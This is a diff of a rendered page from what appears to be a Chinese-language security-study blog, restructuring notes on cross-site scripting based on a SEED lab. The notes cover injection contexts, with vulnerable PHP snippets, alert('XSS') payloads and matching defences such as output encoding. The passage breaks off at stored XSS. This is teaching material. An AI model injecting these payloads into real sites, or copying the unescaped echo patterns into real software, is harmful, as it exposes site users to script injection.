@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="安全学习笔记 × 青春记录 | 一个可以安全试错的环境">
+        <meta name="description" content="结合seedlab实验介绍XSS的原理、分类、利用方式和防御措施等">
       
       
         <meta name="author" content="ethicalpaws">
@@ -25,7 +25,7 @@
     
     
       
-        <title>Xss - 青春沙盒</title>
+        <title>XSS跨站脚本攻击详解 - 青春沙盒</title>
       
     
     
@@ -120,7 +120,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Xss
+              XSS跨站脚本攻击详解
             
           </span>
         </div>
@@ -265,7 +265,7 @@
   
     
   
-  $ 技术学习
+  $技术学习
 
         </a>
       </li>
@@ -497,7 +497,7 @@
   <span class="md-ellipsis">
     
   
-    $ 技术学习
+    $技术学习
   
 
     
@@ -519,7 +519,7 @@
             <span class="md-nav__icon md-icon"></span>
             
   
-    $ 技术学习
+    $技术学习
   
 
           </label>
@@ -685,6 +685,13 @@
   </span>
   
   
+    
+  
+  
+    <span class="md-status md-status--🔄"></span>
+  
+
+  
 
       </a>
     </li>
@@ -712,6 +719,13 @@
     
   </span>
   
+  
+    
+  
+  
+    <span class="md-status md-status--⬜"></span>
+  
+
   
 
       </a>
@@ -1130,6 +1144,8 @@
       
         
       
+        
+      
     
     
     
@@ -1298,6 +1314,34 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../life/study-plan/week5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第5周
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -1348,18 +1392,11 @@
   <span class="md-ellipsis">
     
   
-    [Protected] 💭 烦恼记录
+    💭 烦恼记录
   
 
     
   </span>
-  
-    
-  
-  
-    <span class="md-status md-status--encrypted"></span>
-  
-
   
   
 
@@ -2109,6 +2146,8 @@
   
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -2117,18 +2156,6 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#xss" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        XSS实验
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="XSS实验">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -2138,20 +2165,87 @@
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
     <span class="md-ellipsis">
       
-        概述
+        xss攻击原理
       
     </span>
   </a>
   
 </li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        xss攻击的目的
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        xss攻击的利用条件
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        xss攻击的利用方法
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        xss攻击的形式
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        过滤绕过手法
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验部分
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="实验部分">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
         实验环境搭建
@@ -2162,7 +2256,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
       
         基础实验任务（进阶式）
@@ -2183,13 +2277,8 @@
   
 </li>
         
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
     <span class="md-ellipsis">
       
         工具使用
@@ -2198,15 +2287,20 @@
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
     <span class="md-ellipsis">
       
         实验总结
       
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2241,32 +2335,31 @@
   
 
 
-  <h1>Xss</h1>
-
-<h2 id="xss">XSS实验<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
-<h3 id="_1">实验主题：<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<h1 id="xss">XSS实验<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h1>
+<h2 id="_1">实验主题：<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
 <p>• 跨站脚本攻击
 • XSS 蠕虫和自我传播
 • 会话 cookie
 • HTTP GET 和 POST 请求
 • JavaScript 和 Ajax
 • 内容安全策略（CSP）</p>
-<h3 id="_2">概述<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h2 id="xss_1">xss攻击原理<a class="headerlink" href="#xss_1" title="Permanent link">&para;</a></h2>
 <ol>
-<li>xss攻击原理</li>
 <li>核心攻击链
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>       攻击者构造恶意攻击脚本
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>                |
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  通过用户输入点注入到可信的web页面      
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>                |
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>          受害者访问该页面
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>                |
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>         攻击者构造恶意攻击脚本
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>                  |
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>   通过用户输入点注入到可信的web页面      
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>                  |
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>            受害者访问该页面
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>                  |
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>   浏览器将恶意代码当作这次脚本执行        
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                |
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>        攻击者达成攻击目的
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                  |
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>         攻击者达成攻击目的
 </span></code></pre></div></li>
 <li>本质：浏览器无法区分恶意脚本来自开发者还是攻击者，只要脚本在可信域名下，就会执行        </li>
-<li>xss攻击的目的</li>
+</ol>
+<h2 id="xss_2">xss攻击的目的<a class="headerlink" href="#xss_2" title="Permanent link">&para;</a></h2>
+<ol>
 <li>窃取敏感信息（cookie，session token，本地存储的数据等）</li>
 <li>会话劫持（盗用用户身份，执行任意操作）</li>
 <li>网络钓鱼（伪造登陆页面，骗取账号密码）</li>
@@ -2276,130 +2369,130 @@
 <li>内网探测（利用受害者设备为跳板进行内网扫描）</li>
 <li>蠕虫传播（结合存储型xss自我复制传播）</li>
 <li>配合其他攻击手段（ssrf，csrf）</li>
-<li>xss攻击的利用条件</li>
-<li>web应用能够接收用户输入（存在输入点）<ol>
+</ol>
+<h2 id="xss_3">xss攻击的利用条件<a class="headerlink" href="#xss_3" title="Permanent link">&para;</a></h2>
+<ol>
+<li>web应用能够接收用户输入（存在输入点）</li>
 <li>表单字段（搜索框，留言板等）</li>
 <li>GET/POST参数等</li>
 <li>HTTP头部（UA头，Referer等）</li>
 <li>文件上传（文件名，文件内容等）</li>
-</ol>
-</li>
-<li>将用户的输入输出到回显页面并执行<ol>
+<li>将用户的输入输出到回显页面并执行</li>
 <li>直接输出到HTML body
-     示例：
-        后端
-        <div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">&lt;div class=&quot;comment&quot;&gt;</span>
+      示例：
+         后端
+         <div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">&lt;div class=&quot;comment&quot;&gt;</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$user_comment</span><span class="p">;</span> <span class="cp">?&gt;</span>
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">&lt;/div&gt;</span>
 </span></code></pre></div>
-        攻击者输入
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+         攻击者输入
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        输出的HTML页面
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
+         输出的HTML页面
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        结果：浏览器解析时遇到 \&lt;script&gt; 标签，直接执行其中的代码
-     防御方法：对用户输入进行HTML实体编码后输出
-        后端
-        <div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">&lt;div class=&quot;comment&quot;&gt;</span>
+         结果：浏览器解析时遇到 \&lt;script&gt; 标签，直接执行其中的代码
+      防御方法：对用户输入进行HTML实体编码后输出
+         后端
+         <div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">&lt;div class=&quot;comment&quot;&gt;</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$user_comment</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">&lt;/div&gt;</span>
 </span></code></pre></div>
-        输出
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
+         输出
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;comment&quot;</span><span class="p">&gt;</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>    <span class="ni">&amp;lt;</span>script<span class="ni">&amp;gt;</span>alert(&#39;XSS&#39;);<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        结果：浏览器直接显示<code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code>这段文字而不是解析执行它</li>
+         结果：浏览器直接显示<code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code>这段文字而不是解析执行它</li>
 <li>输出到HTML标签的属性中
-     示例：
-        后端
-        <div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">&lt;input type=&quot;text&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$user_input</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
+      示例：
+         后端
+         <div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">&lt;input type=&quot;text&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$user_input</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
 </span></code></pre></div>
-        攻击者输入 
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&quot; onclick=&quot;alert(&#39;XSS&#39;)&quot; &quot;
+         攻击者输入 
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&quot; onclick=&quot;alert(&#39;XSS&#39;)&quot; &quot;
 </span></code></pre></div>
-        输出后的HTML
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span> <span class="err">&quot;&quot;</span><span class="p">&gt;</span>
+         输出后的HTML
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span> <span class="err">&quot;&quot;</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        结果:攻击者通过闭合属性的引号注入onclick事件属性，当用户点击该输入框就会触发浏览器解析执行代码<code>alert('XSS')</code>
-     防御方法：HTML实体编码</li>
+         结果:攻击者通过闭合属性的引号注入onclick事件属性，当用户点击该输入框就会触发浏览器解析执行代码<code>alert('XSS')</code>
+      防御方法：HTML实体编码</li>
 <li>输出到JavaScript代码（用户输入被直接嵌入到 \&lt;script&gt; 标签内的 JavaScript 代码中，通常作为字符串变量的一部分。）
-     示例：
-        后端
-        <div class="language-php highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">&lt;script&gt;</span>
+      示例：
+         后端
+         <div class="language-php highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="x">&lt;script&gt;</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="x">    var message = &quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$user_msg</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
 </span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="x">    document.write(message);</span>
 </span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="x">&lt;/script&gt;            </span>
 </span></code></pre></div>
-        攻击者输入
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&quot;; alert(&#39;XSS&#39;); var dummy=&quot;
+         攻击者输入
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>&quot;; alert(&#39;XSS&#39;); var dummy=&quot;
 </span></code></pre></div>
-        输出后的HTML
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+         输出后的HTML
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
 </span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);</span><span class="w"> </span><span class="kd">var</span><span class="w"> </span><span class="nx">dummy</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
 </span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
 </span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        结果：攻击者通过引号闭合，分号结束该变量赋值语句，从而插入攻击代码alert('XSS');然后通过一个变量赋值语句闭合原本的引号和分号
-     防御方法：
-        1. 不要让用户的输入直接嵌入JavaScript字符串中
-        2. 如果需要嵌入使用JSON编码确保字符串安全
-            <div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x">&lt;script&gt;</span>
+         结果：攻击者通过引号闭合，分号结束该变量赋值语句，从而插入攻击代码alert('XSS');然后通过一个变量赋值语句闭合原本的引号和分号
+      防御方法：
+         1. 不要让用户的输入直接嵌入JavaScript字符串中
+         2. 如果需要嵌入使用JSON编码确保字符串安全
+             <div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x">&lt;script&gt;</span>
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="x">    var message = </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$user_msg</span><span class="p">,</span> <span class="nx">JSON_HEX_TAG</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">;</span>
 </span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="x">&lt;/script&gt;</span>
 </span></code></pre></div>
-        3. 更好的方法是将数据放在HTML的data-*属性中，然后又JavaScript读取</li>
+         3. 更好的方法是将数据放在HTML的data-*属性中，然后又JavaScript读取</li>
 <li>输出到DOM操作（用户的输入被用于JS的DOM操作函数中，这些函数会动态创建或修改页面内容）
-     示例：
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;comment-container&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+      示例：
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;comment-container&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
 </span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">userInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo $_GET[&#39;comment&#39;]; ?&gt;&quot;</span><span class="p">;</span>
 </span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;comment-container&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userInput</span><span class="p">;</span>
 </span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        攻击者输入
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+         攻击者输入
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        执行后的DOM
-        <div class="language-html highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;comment-container&quot;</span><span class="p">&gt;</span>
+         执行后的DOM
+         <div class="language-html highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;comment-container&quot;</span><span class="p">&gt;</span>
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
 </span></code></pre></div>
-        结果：由于img的src无效从而触发onerror事件，浏览器解析执行<code>alert('XSS')</code>
-     危险的DOM操作函数
-        innerHTML：解析HTML执行\&lt;script&gt;和事件
-        outerHTML：同上
-        insertAdjacentHTML：同上
-        document.write()：写入的内容会被解析为HTML
-     防御措施：使用安全的DOM操作函数：
-        textContent：只写入纯文本
-        innerText：只写入纯文本
-        createTextNode：只创建文本节点</li>
-</ol>
-</li>
-<li>缺乏安全防护<ol>
+         结果：由于img的src无效从而触发onerror事件，浏览器解析执行<code>alert('XSS')</code>
+      危险的DOM操作函数
+         innerHTML：解析HTML执行\&lt;script&gt;和事件
+         outerHTML：同上
+         insertAdjacentHTML：同上
+         document.write()：写入的内容会被解析为HTML
+      防御措施：使用安全的DOM操作函数：
+         textContent：只写入纯文本
+         innerText：只写入纯文本
+         createTextNode：只创建文本节点</li>
+<li>缺乏安全防护</li>
 <li>对用户的输入未做充分过滤</li>
 <li>为对输出进行编码</li>
 <li>未设置CSP策略</li>
 <li>Cookie未设置HttpOnly</li>
 </ol>
-</li>
-<li>xss攻击的利用方法</li>
+<h2 id="xss_4">xss攻击的利用方法<a class="headerlink" href="#xss_4" title="Permanent link">&para;</a></h2>
+<ol>
 <li>基础payload</li>
 <li>绕过技巧</li>
 <li>窃取Cookie</li>
 <li>钓鱼攻击</li>
-<li>xss攻击的形式</li>
+</ol>
+<h2 id="xss_5">xss攻击的形式<a class="headerlink" href="#xss_5" title="Permanent link">&para;</a></h2>
+<ol>
 <li>反射型xss
-      特点：
-        恶意脚本需要在url参数中
-        需要诱导用户点击恶意链接
-        一次性攻击，不持久化
-      攻击流程：
-      <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>攻击者在url参数中构造恶意代码
+   特点：
+     恶意脚本需要在url参数中
+     需要诱导用户点击恶意链接
+     一次性攻击，不持久化
+   攻击流程：
+   <div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>攻击者在url参数中构造恶意代码
 </span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>            |
 </span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    诱导用户点击恶意链接
 </span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>            |
@@ -2409,14 +2502,14 @@
 </span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>            |
 </span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>         完成攻击
 </span></code></pre></div>
-      示例：<code>https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+   示例：<code>https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
 <li>存储型xss
-      特点：
-        恶意脚本存储到服务器中（数据库，文件等）
-        攻击持久化，影响所有访问用户
-        危害最大
-      攻击流程：
